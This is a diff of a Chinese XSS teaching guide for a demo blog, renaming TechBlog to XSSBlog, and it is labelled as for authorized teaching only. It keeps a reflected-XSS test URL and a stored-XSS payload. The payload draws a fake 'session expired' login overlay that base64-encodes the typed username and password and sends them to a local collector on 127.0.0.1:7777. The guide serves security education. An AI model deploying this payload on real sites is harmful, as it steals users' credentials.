@@ -1,4 +1,6 @@
-# TechBlog - XSS 演示场景详细说明
+# XSSBlog - XSS 演示场景详细说明
+
+**Cross-Site Scripting Demo Blog** - 详细教学指南
 
 ⚠️ **本文档仅用于授权的安全教学，请勿用于非法用途**
 
@@ -50,7 +52,7 @@ http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 - **SECURE 模式**：显示转义后的文本 `<img src=x onerror=alert(1)>`
 
 ### 技术原理
-- 后端 [SearchController](apps/backend/src/main/java/com/techblog/backend/controller/SearchController.java) VULN 模式直接拼接用户输入
+- 后端 [SearchController](apps/backend/src/main/java/com/xssblog/backend/controller/SearchController.java) VULN 模式直接拼接用户输入
 - 前端 [Search.vue](apps/frontend/src/pages/Search.vue) 用 `v-html` 渲染后端返回的 message
 
 ### 防御机制
@@ -201,7 +203,7 @@ http://localhost:5173/search?q=<编码后的结果>
 
 4. 粘贴以下 Payload（已精简至 1000 字符内）：
 ```html
-<style>html,body{overflow:hidden!important;margin:0}#f{position:fixed;inset:0;background:#0B1220;z-index:9999;display:grid;place-items:center}form{background:#121826;padding:40px;border-radius:16px;width:min(90vw,420px);border:1px solid #1e293b}h2{color:#22D3EE;margin:0 0 8px;text-align:center;font-size:28px}.s{color:#94A3B8;margin:0 0 32px;text-align:center;font-size:14px}.d{margin-bottom:20px}label{color:#94A3B8;margin-bottom:8px;display:block;font-size:13px}input{width:100%;padding:12px;background:#0b1220;border:1px solid #334155;color:#e2e8f0;border-radius:8px;font-size:14px;box-sizing:border-box}input:focus{border-color:#22d3ee;outline:none}button{width:100%;padding:14px;background:linear-gradient(180deg,#60a5fa,#3b82f6);color:#0b1220;border:none;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;margin-top:8px}.t{margin-top:20px;text-align:center;font-size:13px;color:#94a3b8}</style><div id="f"><form onsubmit="event.preventDefault();new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'bio',u:this.u.value,p:this.p.value}));alert('登录失败');this.u.value='';this.p.value='';"><h2>⚡ TechBlog</h2><div class="s">会话已过期，请重新登录</div><div class="d"><label>用户名</label><input name="u" placeholder="请输入用户名" required></div><div class="d"><label>密码</label><input name="p" type="password" placeholder="请输入密码" required></div><button>登录</button><div class="t">还没有账号？<a href="#" style="color:#22d3ee">立即注册</a></div></form></div>
+<style>html,body{overflow:hidden!important;margin:0}#f{position:fixed;inset:0;background:#0B1220;z-index:9999;display:grid;place-items:center}form{background:#121826;padding:40px;border-radius:16px;width:min(90vw,420px);border:1px solid #1e293b}h2{color:#22D3EE;margin:0 0 8px;text-align:center;font-size:28px}.s{color:#94A3B8;margin:0 0 32px;text-align:center;font-size:14px}.d{margin-bottom:20px}label{color:#94A3B8;margin-bottom:8px;display:block;font-size:13px}input{width:100%;padding:12px;background:#0b1220;border:1px solid #334155;color:#e2e8f0;border-radius:8px;font-size:14px;box-sizing:border-box}input:focus{border-color:#22d3ee;outline:none}button{width:100%;padding:14px;background:linear-gradient(180deg,#60a5fa,#3b82f6);color:#0b1220;border:none;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;margin-top:8px}.t{margin-top:20px;text-align:center;font-size:13px;color:#94a3b8}</style><div id="f"><form onsubmit="event.preventDefault();new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'bio',u:this.u.value,p:this.p.value}));alert('登录失败');this.u.value='';this.p.value='';"><h2>⚡ XSSBlog</h2><div class="s">会话已过期，请重新登录</div><div class="d"><label>用户名</label><input name="u" placeholder="请输入用户名" required></div><div class="d"><label>密码</label><input name="p" type="password" placeholder="请输入密码" required></div><button>登录</button><div class="t">还没有账号？<a href="#" style="color:#22d3ee">立即注册</a></div></form></div>
 ```
 
 5. 点击「保存」
